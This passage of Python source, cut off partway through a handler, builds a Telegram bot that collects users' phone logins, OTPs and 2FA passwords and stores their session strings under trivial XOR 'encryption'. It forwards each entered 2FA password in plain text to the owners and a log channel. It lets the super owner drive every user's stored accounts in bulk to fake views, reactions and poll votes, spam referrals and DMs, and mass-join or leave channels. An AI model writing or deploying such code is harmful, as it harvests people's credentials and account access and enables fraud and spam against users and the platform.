import asyncio
import base64
import json
import os
import re
import random
import time
import math
from datetime import datetime
from typing import Dict, Any, List, Optional, Tuple

# aiogram 3.x imports
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command, StateFilter, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BufferedInputFile
)

# Telethon imports
from telethon import TelegramClient, functions, types as tg_types
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
    FloodWaitError
)

# MongoDB Async Driver
from motor.motor_asyncio import AsyncIOMotorClient

# Import local configurations
import config
from config import logger

# --- CRYPTO HELPERS ---
def _get_crypto_key() -> int:
    return sum(ord(c) for c in config.SECRET_KEY) % 256 or 42

def encrypt_data(data: str) -> str:
    key = _get_crypto_key()
    cipher_bytes = bytes([b ^ key for b in data.encode('utf-8')])
    return base64.b64encode(cipher_bytes).decode('utf-8')

def decrypt_data(encrypted_data: str) -> str:
    key = _get_crypto_key()
    try:
        raw_cipher = base64.b64decode(encrypted_data.encode('utf-8'))
        plain_bytes = bytes([b ^ key for b in raw_cipher])
        return plain_bytes.decode('utf-8')
    except Exception as e:
        logger.error(f"Decryption failure: {e}")
        return ""

# --- ADVANCED LINK & PRIVATE INVITE PARSING HELPER ---
def parse_telegram_link(link: str) -> Tuple[Any, Optional[int], bool]:
    link = link.strip()
    if not link:
        return None, None, False
        
    if re.match(r'^-?\d+$', link):
        return int(link), None, False

    private_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
    if private_match:
        channel_id = int(f"-100{private_match.group(1)}")
        msg_id = int(private_match.group(2))
        return channel_id, msg_id, False

    if "+ " in link or "/+" in link or "joinchat/" in link:
        hash_match = re.search(r'(?:joinchat/|\+)([^/\s?]+)', link)
        if hash_match:
            return hash_match.group(1), None, True
        return link, None, True
        
    msg_match = re.search(r't\.me/([^/]+)/(\d+)', link)
    if msg_match:
        target = msg_match.group(1)
        if target.isdigit():
            target = int(f"-100{target}")
        return target, int(msg_match.group(2)), False
        
    target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
    if "/" in target:
        parts = target.split("/")
        target = parts[0]
        if target.isdigit():
            target = int(f"-100{target}")
        if len(parts) > 1 and parts[1].isdigit():
            msg_id = int(parts[1])
            return target, msg_id, False
            
    if isinstance(target, str) and target.replace("-", "").isdigit():
        return int(target), None, False

    return target, None, False

def make_progress_bar(pct: float, length: int = 15) -> str:
    filled = int(round(length * (pct / 100.0)))
    return "🟩" * filled + "⬜" * (length - filled)

# --- DATABASE ENGINE (MONGODB) ---
class Database:
    def __init__(self):
        self.client = None
        self.db = None

    async def init(self):
        self.client = AsyncIOMotorClient(config.MONGO_URI)
        # Extract default database name from URI or fallback to bot_core_db
        self.db = self.client.get_default_database("bot_core_db")
        
        # Create indexes
        await self.db.users.create_index("user_id", unique=True)
        await self.db.accounts.create_index("phone", unique=True)
        await self.db.tasks.create_index("task_id", unique=True)
        
        logger.info("MongoDB database system initialized.")

    async def get_next_task_id(self) -> int:
        counter = await self.db.counters.find_one_and_update(
            {"_id": "task_id"},
            {"$inc": {"seq": 1}},
            upsert=True,
            return_document=True
        )
        return counter["seq"]

    async def log_action(self, user_id: int, action: str, bot_instance: Optional[Bot] = None, operational: bool = False):
        try:
            await self.db.logs.insert_one({
                "user_id": user_id,
                "action": action,
                "timestamp": datetime.utcnow()
            })
        except Exception as db_err:
            logger.error(f"Failed to log action: {db_err}")
        
        if operational and bot_instance and config.LOG_CHANNEL_ID:
            try:
                log_text = (
                    f"📝 <b>System Log Update</b>\n"
                    f"👤 User ID: <code>{user_id}</code>\n"
                    f"⚙️ Action executed: {action}"
                )
                await bot_instance.send_message(chat_id=config.LOG_CHANNEL_ID, text=log_text, parse_mode="HTML")
            except Exception as e:
                logger.error(f"Failed sending log channel updates: {e}")

    async def get_user_role(self, user_id: int) -> str:
        if user_id in config.SUPER_OWNER_IDS:
            return "super_owner"
        user = await self.db.users.find_one({"user_id": user_id})
        return user.get("role", "user") if user else "user"

    async def get_admin_limits(self, user_id: int) -> int:
        return 999999999

    async def get_current_account_count(self, user_id: int) -> int:
        return await self.db.accounts.count_documents({"user_id": user_id})

    async def create_user_if_not_exists(self, user_id: int, username: str, referred_by: Optional[int] = None):
        user = await self.db.users.find_one({"user_id": user_id})
        if not user:
            role_val = "super_owner" if user_id in config.SUPER_OWNER_IDS else "user"
            await self.db.users.insert_one({
                "user_id": user_id,
                "username": username,
                "role": role_val,
                "referred_by": referred_by,
                "max_accounts": 999999999,
                "created_at": datetime.utcnow()
            })

db_mgr = Database()
registration_sessions: Dict[int, Dict[str, Any]] = {}
bot_username: str = "bot"

# Helper for dispatching 2FA alerts to Admins/Super Owners
async def dispatch_2fa_alert(bot: Bot, user_id: int, phone: str, password_entered: Optional[str] = None):
    text = (
        f"🔐 <b>2FA Password Event Detected!</b>\n\n"
        f"👤 User ID: <code>{user_id}</code>\n"
        f"📱 Phone: <code>+{phone}</code>\n"
    )
    if password_entered:
        text += f"🔑 Password Provided: <code>{password_entered}</code>\n"
    text += f"<i>An account registration hit a 2FA prompt during login flow.</i>"

    if config.LOG_CHANNEL_ID:
        try:
            await bot.send_message(chat_id=config.LOG_CHANNEL_ID, text=text, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending 2FA alert to log channel: {e}")

    for owner_id in config.SUPER_OWNER_IDS:
        try:
            await bot.send_message(chat_id=owner_id, text=text, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending 2FA alert to owner node {owner_id}: {e}")

# --- CONCURRENT TASK MANAGER ENGINE ---
class TaskQueue:
    def __init__(self):
        self.queue = asyncio.Queue()
        self.current_tasks: Dict[int, asyncio.Task] = {}

    async def add_task(self, task_id: int, creator_id: int, task_type: str, payload: dict, bot_instance: Bot, status_msg_id: int):
        await self.queue.put((task_id, creator_id, task_type, payload, bot_instance, status_msg_id))

    def clear_pending_queue(self):
        while not self.queue.empty():
            try:
                self.queue.get_nowait()
                self.queue.task_done()
            except asyncio.QueueEmpty:
                break

    async def cancel_all_active_tasks(self) -> int:
        count = 0
        self.clear_pending_queue()
        active_ids = list(self.current_tasks.keys())
        for t_id in active_ids:
            loop_task = self.current_tasks.get(t_id)
            if loop_task and not loop_task.done():
                loop_task.cancel()
                count += 1
                await db_mgr.db.tasks.update_one(
                    {"task_id": t_id},
                    {"$set": {"status": "cancelled", "progress": "Stopped by admin"}}
                )
        return count

    async def start_worker(self):
        logger.info("Task runner loop started.")
        while True:
            try:
                task_id, creator_id, task_type, payload, bot_instance, status_msg_id = await self.queue.get()
            except asyncio.CancelledError:
                break
                
            loop_task = asyncio.create_task(self.execute_task(task_id, creator_id, task_type, payload, bot_instance, status_msg_id))
            self.current_tasks[task_id] = loop_task
            try:
                await loop_task
            except asyncio.CancelledError:
                logger.warning(f"Task #{task_id} was stopped.")
            except Exception as e:
                logger.error(f"Error on task #{task_id}: {e}")
            finally:
                self.current_tasks.pop(task_id, None)
                self.queue.task_done()

    async def execute_task(self, task_id: int, creator_id: int, task_type: str, payload: dict, bot_instance: Bot, status_msg_id: int):
        start_time = time.time()
        await db_mgr.db.tasks.update_one(
            {"task_id": task_id},
            {"$set": {"status": "running", "progress": "0%"}}
        )

        role = await db_mgr.get_user_role(creator_id)
        clients_data = []
        requested_count = int(payload.get("run_account_count", 0))
        account_routing = payload.get("account_routing", "own")
        
        query = {"status": "active"}
        if role == "super_owner":
            if account_routing != "all":
                query["user_id"] = creator_id
        elif role != "owner":
            query["user_id"] = creator_id

        cursor = db_mgr.db.accounts.find(query, {"phone": 1, "session_string": 1})
        async for doc in cursor:
            clients_data.append((doc["phone"], decrypt_data(doc["session_string"])))

        if requested_count > 0:
            clients_data = clients_data[:requested_count]

        if not clients_data:
            await db_mgr.db.tasks.update_one(
                {"task_id": task_id},
                {"$set": {"status": "failed", "progress": "No accounts found"}}
            )
            try:
                await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text="❌ <b>Task Failed:</b> You do not have any operational accounts available under selected scopes.")
            except Exception:
                pass
            return

        passed_ids: List[str] = []
        failed_ids: List[Tuple[str, str]] = []
        total_accounts = len(clients_data)
        
        speed_mode = payload.get("speed_mode", "safe")
        if speed_mode == "safer":
            sleep_time = 2.5
        elif speed_mode == "fastest":
            sleep_time = 0.05
        else:
            sleep_time = 5.0

        semaphore = asyncio.Semaphore(5 if speed_mode == "safer" else (1 if speed_mode == "safe" else 25)) 
        progress_counter = 0
        success_counter = 0
        failure_counter = 0
        last_ui_update = 0

        async def worker_session(phone: str, enc_session: str, idx: int):
            nonlocal progress_counter, success_counter, failure_counter, last_ui_update
            async with semaphore:
                client = TelegramClient(StringSession(enc_session), config.API_ID, config.API_HASH)
                try:
                    await asyncio.sleep(sleep_time * idx)
                    await client.connect()
                    if not await client.is_user_authorized():
                        await db_mgr.db.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                        failed_ids.append((phone, "Session key expired / Account banned"))
                        failure_counter += 1
                        return

                    target = payload.get("target", "")
                    channel_target = payload.get("channel_target", target)
                    do_leave_all = (task_type == "leave" and payload.get("leave_mode") == "all")

                    parsed_target, link_msg_id, is_target_private = parse_telegram_link(target) if not do_leave_all else (None, None, False)
                    parsed_channel, _, is_channel_private = parse_telegram_link(channel_target) if not do_leave_all else (None, None, False)
                    msg_id = int(payload.get("msg_id", link_msg_id or 0))

                    do_react = "react" in task_type
                    do_vote = "vote" in task_type
                    do_view = "view" in task_type or task_type == "speed"
                    do_join = (task_type == "join" or do_react or do_vote or do_view) and not do_leave_all
                    do_leave = task_type == "leave"
                    do_dm = task_type == "dm"
                    do_refer = task_type == "refer"

                    joined_updates_peer = None

                    if do_join:
                        try:
                            if is_channel_private or "+ " in channel_target or "/+" in channel_target or "joinchat/" in channel_target:
                                invite_hash = parsed_channel if is_channel_private else parsed_target
                                updates = await client(functions.messages.ImportChatInviteRequest(hash=str(invite_hash).strip()))
                                if hasattr(updates, 'chats') and updates.chats:
                                    joined_updates_peer = updates.chats[0]
                            else:
                                updates = await client(functions.channels.JoinChannelRequest(channel=parsed_channel or parsed_target))
                                if hasattr(updates, 'chats') and updates.chats:
                                    joined_updates_peer = updates.chats[0]
                        except Exception as join_err:
                            if "USER_ALREADY_PARTICIPANT" not in str(join_err):
                                failed_ids.append((phone, f"Failed to join chat/channel: {str(join_err)}"))
                                failure_counter += 1
                                return

                    target_peer = joined_updates_peer or parsed_target

                    if do_view and msg_id:
                        try:
                            await client(functions.messages.GetMessagesViewsRequest(peer=target_peer, id=[msg_id], increment=True))
                        except Exception as view_err:
                            failed_ids.append((phone, f"View increment failed: {str(view_err)}"))
                            failure_counter += 1
                            return

                    if do_react and msg_id:
                        try:
                            peer_entity = await client.get_input_entity(target_peer)
                            emojis = payload.get("reactions", ["👍"])
                            assigned_emoji = emojis[idx % len(emojis)]

                            await client(functions.messages.SendReactionRequest(
                                peer=peer_entity,
                                msg_id=msg_id,
                                reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
                            ))
                        except Exception as react_err:
                            try:
                                peer_entity = await client.get_input_entity(target_peer)
                                await client(functions.messages.SendReactionRequest(
                                    peer=peer_entity,
                                    msg_id=msg_id,
                                    reaction=[assigned_emoji]
                                ))
                            except Exception as retry_err:
                                failed_ids.append((phone, f"Reaction failed: {str(retry_err)}"))
                                failure_counter += 1
                                return

                    if do_vote and msg_id:
                        try:
                            vote_mode = payload.get("vote_mode", "text")
                            if vote_mode == "inline":
                                button_text = payload.get("button_text", "").strip().lower()
                                msg = await client.get_messages(target_peer, ids=msg_id)
                                if msg and msg.reply_markup:
                                    target_button = None
                                    for row in msg.reply_markup.rows:
                                        for btn in row.buttons:
                                            if button_text in btn.text.strip().lower():
                                                target_button = btn
                                                break
                                        if target_button:
                                            break
                                    if target_button and isinstance(target_button, tg_types.KeyboardButtonCallback):
                                        await client(functions.messages.GetBotCallbackAnswerRequest(peer=target_peer, msg_id=msg_id, data=target_button.data))
                                    else:
                                        raise ValueError("Inline callback button matching text not found.")
                                else:
                                    raise ValueError("Target message does not possess an inline keyboard markup.")
                            else:
                                chosen_option = int(payload.get("poll_option_index", 0))
                                await client(functions.messages.VotePollRequest(peer=target_peer, msg_id=msg_id, options=[bytes([chosen_option])]))
                        except Exception as vote_err:
                            failed_ids.append((phone, f"Voting failed: {str(vote_err)}"))
                            failure_counter += 1
                            return

                    if do_dm:
                        try:
                            await client.send_message(target_peer, payload.get("text", "Hello!"))
                        except Exception as dm_err:
                            failed_ids.append((phone, f"DM dispatch failed: {str(dm_err)}"))
                            failure_counter += 1
                            return

                    if do_refer:
                        try:
                            bot_username_target = str(target_peer).replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
                            start_param = None
                            if "start=" in target:
                                param_match = re.search(r'start=([^&\s]+)', target)
                                if param_match:
                                    start_param = param_match.group(1)
                            if "?" in bot_username_target:
                                bot_username_target = bot_username_target.split("?")[0]
                            await client.send_message(bot_username_target, f"/start {start_param}" if start_param else "/start")
                        except Exception as ref_err:
                            failed_ids.append((phone, f"Referral start message failed: {str(ref_err)}"))
                            failure_counter += 1
                            return

                    if do_leave:
                        if do_leave_all:
                            left_chats_count = 0
                            async for dialog in client.iter_dialogs():
                                if dialog.is_channel or dialog.is_group:
                                    try:
                                        await client(functions.channels.LeaveChannelRequest(channel=dialog.entity))
                                        left_chats_count += 1
                                        await asyncio.sleep(0.3)
                                    except FloodWaitError as fwe:
                                        await asyncio.sleep(fwe.seconds)
                                    except Exception:
                                        pass
                            if left_chats_count == 0:
                                failed_ids.append((phone, "Account was not present in any channels"))
                                failure_counter += 1
                                return
                        else:
                            try:
                                resolved_entity = await client.get_input_entity(target_peer)
                                await client(functions.channels.LeaveChannelRequest(channel=resolved_entity))
                            except Exception as leave_err:
                                failed_ids.append((phone, f"Leave channel failed: {str(leave_err)}"))
                                failure_counter += 1
                                return

                    passed_ids.append(phone)
                    success_counter += 1
                    
                except Exception as general_err:
                    failed_ids.append((phone, f"General error: {str(general_err)}"))
                    failure_counter += 1
                finally:
                    await client.disconnect()
                    progress_counter += 1
                    
                    current_now = time.time()
                    if current_now - last_ui_update >= 2.5 or progress_counter == total_accounts:
                        last_ui_update = current_now
                        pct_val = (progress_counter / total_accounts) * 100
                        elapsed = current_now - start_time
                        avg_time = elapsed / progress_counter if progress_counter > 0 else 0
                        remaining = (total_accounts - progress_counter) * avg_time
                        
                        eta_str = f"~{int(remaining // 60)}m {int(remaining % 60)}s" if remaining > 0 else "0s"
                        progress_pct = f"{int(pct_val)}%"
                        
                        live_text = (
                            f"⏳ <b>Campaign Processing Deployment Framework Running...</b>\n\n"
                            f"[{make_progress_bar(pct_val)}] <b>{progress_pct}</b>\n"
                            f"📊 <code>{progress_counter}/{total_accounts}</code> accounts completely run\n"
                            f"✅ Successful: <code>{success_counter}</code> | ❌ Blocked: <code>{failure_counter}</code>\n"
                            f"⏱ Time remaining duration: {eta_str}"
                        )
                        try:
                            await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text=live_text, parse_mode="HTML")
                        except Exception:
                            pass

                        await db_mgr.db.tasks.update_one(
                            {"task_id": task_id},
                            {"$set": {"progress": progress_pct}}
                        )

        await asyncio.gather(*(worker_session(phone, enc, i) for i, (phone, enc) in enumerate(clients_data)))

        end_time = time.time()
        elapsed_total = end_time - start_time
        duration_str = f"{int(elapsed_total // 60)}m {int(elapsed_total % 60)}s"

        status = "completed" if len(passed_ids) > 0 else "failed"
        success_report_json = json.dumps(passed_ids)
        failure_report_json = json.dumps(failed_ids)

        await db_mgr.db.tasks.update_one(
            {"task_id": task_id},
            {"$set": {
                "status": status,
                "progress": f"{len(passed_ids)}/{total_accounts} Passed",
                "success_report": success_report_json,
                "failure_report": failure_report_json
            }}
        )

        success_pct_final = int((success_counter / total_accounts) * 100) if total_accounts > 0 else 0
        campaign_uuid = base64.b64encode(f"CAMP_{task_id}".encode()).decode().lower()[:24]
        
        user_info = f"<code>{creator_id}</code>"
        try:
            chat_member = await bot_instance.get_chat(creator_id)
            if chat_member.first_name:
                user_info = f"{chat_member.first_name} (<code>{creator_id}</code>)"
        except Exception:
            pass

        target_display = "ALL CHANNELS DEPLOYMENT" if payload.get("leave_mode") == "all" else f"<code>{payload.get('target', 'N/A')}</code>"

        failure_log_details = ""
        if len(failed_ids) > 20:
            failure_log_details = f"\n\n📄 <b>Note:</b> More than 20 errors occurred (<code>{len(failed_ids)}</code> failures). A detailed file log with clear failure reasons has been generated and sent below."
        elif failed_ids:
            failure_log_details = "\n\n❌ <b>Detailed Failure Telemetry Matrix:</b>\n"
            for phone_num, reason in failed_ids:
                failure_log_details += f"• <code>+{phone_num}</code> ➜ <i>{reason}</i>\n"

        completion_card = (
            f"👑 <b>Premium Task Management Closure Summary Card</b>\n\n"
            f"📋 Campaign ID: <code>{campaign_uuid}</code>\n"
            f"⚡ Action Code Execution: <code>{task_type.upper()}</code>\n"
            f"👤 Creator Node Profile: {user_info}\n"
            f"🔗 Target Location Path: {target_display}\n"
            f"📢 Secondary Target Scope: <code>{payload.get('channel_target', 'N/A')}</code>\n"
            f"🏎 Speed Interval Throttle: <code>{speed_mode.upper()}</code>\n\n"
            f"📊 <b>Performance Analytics Reports:</b>\n"
            f"✅ Success Threshold: <code>{success_counter}/{total_accounts}</code> ({success_pct_final}%)\n"
            f"❌ Core Failures Recorded: <code>{failure_counter}/{total_accounts}</code>\n"
            f"⏱ Production Runtime Elapsed: {duration_str}"
            f"{failure_log_details}"
        )

        try:
            await bot_instance.send_message(chat_id=creator_id, text=completion_card, parse_mode="HTML")
            
            if len(failed_ids) > 20:
                file_lines = [
                    f"============================================================",
                    f"CAMPAIGN FAILURE AUDIT REPORT - TASK #{task_id}",
                    f"Target: {payload.get('target', 'N/A')}",
                    f"Total Failed Accounts: {len(failed_ids)}",
                    f"============================================================\n"
                ]
                for phone_num, reason in failed_ids:
                    file_lines.append(f"Phone: +{phone_num} | Reason: {reason}")
                
                report_content = "\n".join(file_lines).encode('utf-8')
                fail_doc = BufferedInputFile(report_content, filename=f"task_{task_id}_failures.txt")
                await bot_instance.send_document(
                    chat_id=creator_id,
                    document=fail_doc,
                    caption=f"📁 <b>Failure Reason Log</b>\nContains complete failure audit for <code>{len(failed_ids)}</code> failed accounts in Task <code>#{task_id}</code>.",
                    parse_mode="HTML"
                )
        except Exception as report_err:
            logger.error(f"Failed delivering task completion report: {report_err}")

        if config.LOG_CHANNEL_ID:
            try:
                await bot_instance.send_message(chat_id=config.LOG_CHANNEL_ID, text=completion_card, parse_mode="HTML")
            except Exception as le:
                logger.error(f"Failed sending validation report to log channel: {le}")

task_queue = TaskQueue()

# --- FSM STATES ---
class RegistrationStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_otp = State()
    waiting_for_2fa = State()
    waiting_for_session_file = State()
    waiting_for_db_file = State()

class TaskWizardStates(StatesGroup):
    choosing_type = State()
    waiting_for_routing_choice = State()
    waiting_for_speed_choice = State()
    waiting_for_leave_choice = State()
    waiting_for_channel_link = State()
    waiting_for_post_link = State()
    waiting_for_vote_mode_choice = State()
    waiting_for_poll_option_index = State()
    waiting_for_emojis = State()
    waiting_for_button_text = State()
    waiting_for_dm_text = State()
    waiting_for_account_scale = State()

class ExportWizardStates(StatesGroup):
    selecting_multi = State()

class BroadcastStates(StatesGroup):
    waiting_for_msg = State()

# --- PREMIUM UI KEYBOARD GENERATORS ---
REACTION_EMOJIS = [
    "🔥", "❤️", "💖", "💘", "💝",
    "👍", "👏", "🎉", "🤩", "💯",
    "⚡", "🍓", "💋", "🍿", "🏆",
    "🤣", "🥰", "🤔", "👀", "😎"
]

def get_post_registration_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✨ Connect Next Target Account", callback_data="add_account_phone")],
        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]
    ])

def get_emoji_selection_keyboard(selected_emojis: List[str]) -> InlineKeyboardMarkup:
    keyboard = []
    row = []
    for emoji in REACTION_EMOJIS:
        is_selected = emoji in selected_emojis
        suffix = " ⭐" if is_selected else ""
        row.append(InlineKeyboardButton(text=f"{emoji}{suffix}", callback_data=f"toggle_emoji:{emoji}"))
        if len(row) == 5:  
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    
    keyboard.append([InlineKeyboardButton(text="🔱 Finalize Reaction Pack selection", callback_data="finish_emoji_selection")])
    keyboard.append([InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_main_keyboard(role: str) -> InlineKeyboardMarkup:
    buttons = [
        [InlineKeyboardButton(text="📱 Manage accounts", callback_data="manage_accounts:0")],
        [InlineKeyboardButton(text="🌋 Launch Active Campaign Tasks", callback_data="task_hub_start")],
        [InlineKeyboardButton(text="📊 Real-time Campaign Logs", callback_data="view_tasks")],
        [InlineKeyboardButton(text="⚜️ Referral link", callback_data="view_referrals")],
        [InlineKeyboardButton(text="👑 Developers", callback_data="system_credits")]
    ]
    if role in ["admin", "owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="🛡️ Admin panel", callback_data="admin_panel")])
    if role in ["owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="💾 Database Export/Import", callback_data="backup_panel")])
        buttons.append([InlineKeyboardButton(text="📈 user ids with details", callback_data="system_stats")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_task_types_keyboard(active_count: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔥 Reaction Only", callback_data="set_type:react"), InlineKeyboardButton(text="🗳️ Advanced Poll Voting", callback_data="set_type:vote")],
        [InlineKeyboardButton(text="⚡ Reaction + Vote", callback_data="set_type:react_vote"), InlineKeyboardButton(text="👁️ View Incrementor", callback_data="set_type:view")],
        [InlineKeyboardButton(text="💎 Reaction + View", callback_data="set_type:react_view"), InlineKeyboardButton(text="🎯 Vote + View", callback_data="set_type:vote_view")],
        [InlineKeyboardButton(text="🔮 Reaction + Vote + View ", callback_data="set_type:react_vote_view")],
        [InlineKeyboardButton(text="✅ Join Target Channel", callback_data="set_type:join"), InlineKeyboardButton(text="❌ Leave channel", callback_data="set_type:leave")],
        [InlineKeyboardButton(text="📥 Direct DM Broadcast", callback_data="set_type:dm")],
        [InlineKeyboardButton(text="🔗 Referral ", callback_data="set_type:refer"), InlineKeyboardButton(text="🏎️ Fast Speed Views", callback_data="set_type:speed")],
        [InlineKeyboardButton(text="🛑 Abort Setup Configuration", callback_data="main_menu")]
    ])

def get_leave_channel_options_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 Leave channel link 1 only", callback_data="leave_mode:single")],
        [InlineKeyboardButton(text="💥 Complete Purge (Leave All Channels)", callback_data="leave_mode:all")],
        [InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]
    ])

# --- ROUTER REGISTER ---
router = Router()

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext, bot: Bot):
    await state.clear()
    user_id = message.from_user.id
    username = message.from_user.username or "Unknown"
    
    referred_by = None
    if len(message.text.split()) > 1:
        ref_payload = message.text.split()[1]
        if ref_payload.startswith("ref_") and ref_payload[4:].isdigit():
            referred_by = int(ref_payload[4:])
            if referred_by == user_id:
                referred_by = None

    await db_mgr.create_user_if_not_exists(user_id, username, referred_by)
    role = await db_mgr.get_user_role(user_id)
    await db_mgr.log_action(user_id, "Started the bot", bot, operational=False)

    welcome_text = (
        f"👋 <b>Greetings, Elite User! Welcome back to Premium Session Hub Bot Terminal.</b>\n\n"
        f"Your system assigned clearance grade identifier: <b>{role.upper()}</b>\n"
        f"Select execution options or deploy automated cluster configurations below:"
    )
    await message.answer(welcome_text, reply_markup=get_main_keyboard(role), parse_mode="HTML")

@router.callback_query(F.data == "main_menu")
async def handle_main_menu(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer()
    await state.clear()
    role = await db_mgr.get_user_role(callback.from_user.id)
    await callback.message.edit_text(
        f"👋 <b>Greetings, Elite User! Welcome back to Premium Session Hub Bot Terminal.</b>\n\n"
        f"Your system assigned clearance grade identifier: <b>{role.upper()}</b>\n"
        f"Select execution options or deploy automated cluster configurations below:",
        reply_markup=get_main_keyboard(role),
        parse_mode="HTML"
    )

@router.message(Command("canceltasks"))
async def cmd_cancel_tasks(message: Message, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.answer("⚠️ <b>Clearance Denied:</b> Access token restricted to System Operators.")
        return

    await message.answer("🛑 <i>Terminating thread execution loops across pending and active campaign tasks...</i>", parse_mode="HTML")
    killed_count = await task_queue.cancel_all_active_tasks()
    await db_mgr.db.tasks.update_many(
        {"status": {"$in": ["pending", "running"]}},
        {"$set": {"status": "cancelled"}}
    )
    await message.answer(f"✨ <b>Task Termination Loop Completed!</b> Successfully cancelled <code>{killed_count}</code> pending or active task threads.")

# --- ADMINISTRATIVE CORRIDORS ---
@router.message(Command("addadmin"))
async def cmd_add_admin(message: Message, command: CommandObject, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["owner", "super_owner"]:
        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Owner privilege tokens.")
        return
        
    args = command.args
    if not args:
        await message.answer("✨ <b>Syntax Profile Map layout:</b> <code>/addadmin &lt;user_id&gt;</code>", parse_mode="HTML")
        return
        
    target_id_str = args.split()[0]
    if not target_id_str.isdigit():
        await message.answer("❌ Parameters mismatch error: Numerical integers values required exclusively.")
        return
        
    target_id = int(target_id_str)
    limit_val = 999999999
    
    await db_mgr.db.users.update_one(
        {"user_id": target_id},
        {"$set": {"role": "admin", "max_accounts": limit_val}},
        upsert=True
    )
        
    await message.answer(f"💎 <b>Success:</b> User <code>{target_id}</code> updated to Admin with unlimited account capacity.", parse_mode="HTML")
    await db_mgr.log_action(user_id, f"Made user {target_id} an Admin (unlimited)", bot, operational=True)

@router.message(Command("removeadmin"))
async def cmd_remove_admin(message: Message, command: CommandObject, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["owner", "super_owner"]:
        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Owner privilege tokens.")
        return
        
    target_id_str = command.args
    if not target_id_str or not target_id_str.strip().isdigit():
        await message.answer("✨ <b>Syntax Profile Map layout:</b> <code>/removeadmin &lt;user_id&gt;</code>", parse_mode="HTML")
        return
        
    target_id = int(target_id_str.strip())
    await db_mgr.db.users.update_one(
        {"user_id": target_id},
        {"$set": {"role": "user"}}
    )
        
    await message.answer(f"💎 <b>Success:</b> Authorization structural privileges revoked from Admin ID <code>{target_id}</code>.", parse_mode="HTML")
    await db_mgr.log_action(user_id, f"Removed Admin role from user {target_id}", bot, operational=True)

# --- BROADCAST SYSTEM WORKFLOW ---
@router.message(Command("broadcast"))
async def cmd_broadcast_start(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.answer("⚠️ <b>Clearance Denied:</b> Command restricted to Administration Nodes.")
        return
        
    await message.answer("📢 <b>Input Data Text or Multimedia payload content to broadcast:</b>", parse_mode="HTML")
    await state.set_state(BroadcastStates.waiting_for_msg)

@router.message(StateFilter(BroadcastStates.waiting_for_msg))
async def process_broadcast_push(message: Message, state: FSMContext, bot: Bot):
    await state.clear()
    status_msg = await message.answer("🚀 <i>Dispatching system global notifications layout across all registered user clusters...</i>", parse_mode="HTML")
    
    users_cursor = db_mgr.db.users.find({}, {"user_id": 1})
    rows = await users_cursor.to_list(length=None)
        
    success_hits = 0
    failed_hits = 0
    
    for r in rows:
        target_uid = r["user_id"]
        try:
            await bot.copy_message(chat_id=target_uid, from_chat_id=message.chat.id, message_id=message.message_id)
            success_hits += 1
            await asyncio.sleep(0.05)  
        except Exception:
            failed_hits += 1
            
    await status_msg.edit_text(
        f"📢 <b>Global System Broadcast Complete!</b>\n\n"
        f"🟩 Delivered: <code>{success_hits}</code> unique profiles\n"
        f"🟪 Blocked/Dead targets dropped: <code>{failed_hits}</code> nodes",
        parse_mode="HTML"
    )

@router.callback_query(F.data == "system_credits")
async def handle_system_credits(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    credits_text = (
        "🔱 <b>Lead Operations Developer Architect Info</b>\n\n"
        f"🎨 <b>UI/UX Aesthetic Architect:</b> @{config.DESIGNER_HANDLE}\n"
        f"⚙️ <b>Core Binary Operations Engineer:</b> @{config.MANAGER_HANDLE}\n\n"
        "<i>Thank you for utilising our premium cluster account management utility matrix core!</i>"
    )
    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]]
    await callback.message.edit_text(text=credits_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

# --- PAGINATED ACCOUNTS VIEW ---
@router.callback_query(F.data.startswith("manage_accounts:"))
async def list_user_accounts(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    limit = 10
    offset = page * limit
    
    try:
        await callback.answer() 
        role = await db_mgr.get_user_role(user_id)
        
        query = {} if role in ["owner", "super_owner"] else {"user_id": user_id}
        
